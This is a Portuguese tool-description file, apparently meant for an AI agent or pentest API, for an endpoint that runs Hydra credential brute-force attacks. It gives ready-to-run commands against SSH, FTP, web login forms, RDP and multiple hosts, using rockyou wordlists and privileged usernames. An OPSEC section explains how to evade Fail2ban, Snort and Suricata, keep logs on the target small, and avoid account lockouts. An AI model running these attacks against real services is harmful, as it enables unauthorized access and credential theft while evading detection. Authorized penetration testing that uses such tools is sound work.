---
name: "hydra"
description: "Ferramenta de brute force multi-protocolo capaz de atacar dezenas de servicos de rede. Suporta SSH, FTP, HTTP, HTTPS, RDP, SMB, MySQL, MSSQL, VNC, SMTP, IMAP, POP3, LDAP, SNMP. Usa paralelismo com threads. Use para ataques de dicionario ou brute force autenticados contra servicos de rede."
---

# hydra

## Objetivo

O Hydra e uma das ferramentas de brute force de credenciais mais completas disponiveis. Realiza ataques de dicionario ou forca bruta contra servicos de rede, testando combinacoes de usuario e senha em alta velocidade com suporte a paralelismo. Casos de uso:

- Ataques de dicionario com wordlists externas (rockyou, SecLists, etc.)
- Geracao de senhas em tempo real com padroes customizados (-x)
- Ataques contra multiplos hosts simultaneamente (-M)
- Formularios HTTP/HTTPS com campos e strings de falha customizados (http-post-form)
- Parar automaticamente no primeiro par valido encontrado (-f)
- Testar senhas triviais: nula, igual ao usuario, reverso do usuario (-e nsr)
- Retomar sessoes interrompidas sem perder progresso (-R)

## Endpoint

```
POST /api/bruteforce/hydra
```

## Requer target

Sim. O campo `target` deve conter o IP ou hostname do host alvo.

## Parametros

| Parametro | Tipo   | Obrigatorio | Descricao                                                                     |
|-----------|--------|-------------|-------------------------------------------------------------------------------|
| target    | string | Sim         | IP ou hostname do host alvo (ex: 192.168.1.10, 10.0.0.1)                     |
| service   | string | Sim         | Protocolo/servico a atacar (ex: ssh, ftp, rdp, http-post-form, smb)           |
| username  | string | Condicional | Usuario unico a testar. Use quando o nome de usuario for conhecido            |
| passlist  | string | Condicional | Caminho absoluto da wordlist (/usr/share/wordlists/rockyou.txt)               |
| options   | string | Nao         | Flags adicionais do CLI passadas diretamente ao Hydra                         |

## Flags Importantes

| Flag               | Descricao                                                                          |
|--------------------|------------------------------------------------------------------------------------|
| -l user            | Define um unico usuario para o ataque                                              |
| -L userlist        | Define uma lista de usuarios (arquivo, um por linha)                               |
| -p password        | Define uma unica senha para testar                                                 |
| -P passlist        | Define uma wordlist de senhas (arquivo, uma por linha)                             |
| -t N               | Numero de threads paralelas por host (padrao: 16, max recomendado: 64)             |
| -s port            | Porta nao-padrao do servico                                                        |
| -v                 | Verbose: exibe tentativas falhas e informacoes de conexao                          |
| -V                 | Extra verbose: exibe cada par usuario:senha no momento do teste                    |
| -f                 | Para o ataque ao encontrar o primeiro par valido no host atual                     |
| -F                 | Para o ataque global ao encontrar qualquer credencial valida em qualquer host      |
| -o file            | Salva todos os resultados encontrados em arquivo de texto                          |
| -e nsr             | Extras: n=senha vazia, s=igual ao usuario, r=reverso do usuario                   |
| -w seconds         | Timeout de espera por resposta do servidor (padrao: 32 segundos)                   |
| -x min:max:charset | Gera senhas on-the-fly (ex: 4:6:aA1 = alfanumerico de 4 a 6 caracteres)           |
| -M hostlist        | Ataca multiplos hosts listados em arquivo (um IP/host por linha)                   |
| -u                 | Itera usuarios antes de senhas (padrao: itera senhas por usuario)                  |
| -R                 | Retoma sessao interrompida anteriormente a partir do ponto parado                  |
| -S                 | Forca uso de SSL/TLS na conexao                                                    |
| -6                 | Habilita suporte a enderecamento IPv6                                              |

### Servicos Suportados

| Categoria     | Servicos                                                                |
|---------------|-------------------------------------------------------------------------|
| Remote Access | ssh, rdp, telnet, vnc                                                   |
| File Transfer | ftp, ftps, sftp                                                         |
| Web           | http-get, http-post-form, https-get, https-post-form, http-head         |
| Mail          | smtp, smtp-enum, pop3, pop3s, imap, imaps                               |
| Database      | mysql, mssql, oracle, oracle-listener, postgres                         |
| Directory     | ldap2, ldap3, ldaps                                                     |
| Network       | snmp, sip, rsh, rlogin, rexec                                           |
| Other         | smb, xmpp, pcnfs, nntp, cvs, svn, teamspeak, redis                     |

## Exemplos

### Caso 1 - Brute force SSH com usuario fixo e wordlist

```json
{
  "target": "192.168.1.10",
  "service": "ssh",
  "username": "root",
  "passlist": "/usr/share/wordlists/rockyou.txt",
  "options": "-t 4 -f -V"
}
```

Comando CLI equivalente:
```
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f -V 192.168.1.10 ssh
```

Use -t 4 para limitar threads e -f para parar ao encontrar a primeira credencial valida.

### Caso 2 - Brute force FTP com lista de usuarios e lista de senhas

```json
{
  "target": "10.0.0.50",
  "service": "ftp",
  "options": "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 8 -f -o /tmp/ftp_results.txt"
}
```

Comando CLI equivalente:
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 8 -f -o /tmp/ftp_results.txt 10.0.0.50 ftp
```

A flag -o salva automaticamente os pares validos encontrados no arquivo especificado.

### Caso 3 - Brute force formulario HTTP POST (login web)

```json
{
  "target": "192.168.1.100",
  "service": "http-post-form",
  "username": "admin",
  "passlist": "/usr/share/wordlists/rockyou.txt",
  "options": "-t 16 -f /login.php:username=^USER^&password=^PASS^:Invalid credentials"
}
```

Comando CLI equivalente:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -f 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

Formato do parametro http-post-form: url:campos_do_form:string_de_falha
O ^USER^ e ^PASS^ sao substituidos automaticamente. A string de falha e o texto retornado quando as credenciais sao invalidas.

### Caso 4 - Brute force RDP com porta nao-padrao e testes de senha trivial

```json
{
  "target": "10.10.10.75",
  "service": "rdp",
  "username": "administrator",
  "passlist": "/usr/share/wordlists/rockyou.txt",
  "options": "-s 3389 -t 4 -f -e nsr -V"
}
```

Comando CLI equivalente:
```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -s 3389 -t 4 -f -e nsr -V 10.10.10.75 rdp
```

A flag -e nsr testa 3 casos antes da wordlist:
  n = senha vazia (autenticacao sem password)
  s = senha identica ao nome do usuario (administrator:administrator)
  r = senha e o reverso do nome do usuario (administrator:rotartsinimda)

### Caso 5 - Ataque a multiplos hosts com geracao de senha on-the-fly

```json
{
  "target": "N/A",
  "service": "ssh",
  "options": "-M /tmp/hosts.txt -l admin -x 4:6:aA1 -t 4 -f -o /tmp/multi_results.txt"
}
```

Comando CLI equivalente:
```
hydra -M /tmp/hosts.txt -l admin -x 4:6:aA1 -t 4 -f -o /tmp/multi_results.txt ssh
```

Formato de -x: min:max:charset
  4:6 = comprimento minimo 4, maximo 6 caracteres
  a   = inclui letras minusculas (a-z)
  A   = inclui letras maiusculas (A-Z)
  1   = inclui numeros (0-9)
O arquivo /tmp/hosts.txt deve conter um IP ou hostname por linha.

## OPSEC

- **Ruido alto por padrao**: Com -t 16 o Hydra gera dezenas de tentativas por segundo. Ambientes com Fail2ban, Snort, Suricata ou rate limiting bloquearao o IP atacante rapidamente. Reduza para -t 1 ou -t 4 em alvos com protecao ativa.
- **Lockout de conta**: Ambientes Active Directory bloqueiam contas apos 3-5 tentativas falhas por padrao. Valide a politica de lockout (Account Lockout Policy) antes de lancar o ataque para nao travar contas criticas.
- **SSH MaxAuthTries**: OpenSSH encerra a conexao apos o limite de tentativas (padrao: 6). Use -w 3 para limitar tempo de espera e -t 1 para evitar multiplas conexoes simultaneas que disparam o limite.
- **CSRF em formularios web**: O Hydra nao suporta tokens CSRF dinamicos. Se o formulario exigir token, o ataque falhara silenciosamente pois o servidor rejeitara o POST. Use Burp Intruder ou ferramentas com suporte a sessao nesse caso.
- **Logs no alvo**: Toda tentativa falha gera entrada no syslog (Linux) ou Event Viewer (Windows). Use -f para parar imediatamente apos o primeiro sucesso e minimizar o volume de logs gerado.
- **Wordlists enxutas primeiro**: Antes de lancar rockyou.txt (14 milhoes de entradas), teste com listas pequenas (top100.txt, senhas padrao do fabricante, variantes do hostname). Reduz tempo e exposicao.
- **Retomar sessao**: Se o ataque for interrompido (Ctrl+C, queda de rede), use -R para retomar exatamente do ponto parado sem repetir tentativas ja executadas.
- **Prefira -o para rastreabilidade**: Sempre salve os resultados com -o /tmp/resultado.txt para documentar credenciais encontradas e facilitar o relatorio pos-engajamento.

## Saida

A API retorna um objeto JSON com os seguintes campos:

| Campo     | Tipo    | Descricao                                                              |
|-----------|---------|------------------------------------------------------------------------|
| success   | boolean | true se a execucao ocorreu sem erros fatais                            |
| stdout    | string  | Saida padrao do Hydra com credenciais encontradas (se houver)          |
| stderr    | string  | Erros e avisos emitidos pela ferramenta durante a execucao             |
| report    | string  | Resumo estruturado gerado pela API com credenciais extraidas           |
| artifacts | array   | Lista de arquivos gerados (ex: arquivo salvo com -o)                   |

Exemplo de stdout com credencial encontrada:
```
[22][ssh] host: 192.168.1.10   login: root   password: toor
1 of 1 target successfully completed, 1 valid password found
```

Exemplo de stdout sem credenciais encontradas:
```
0 of 1 target completed, 0 valid passwords found
```
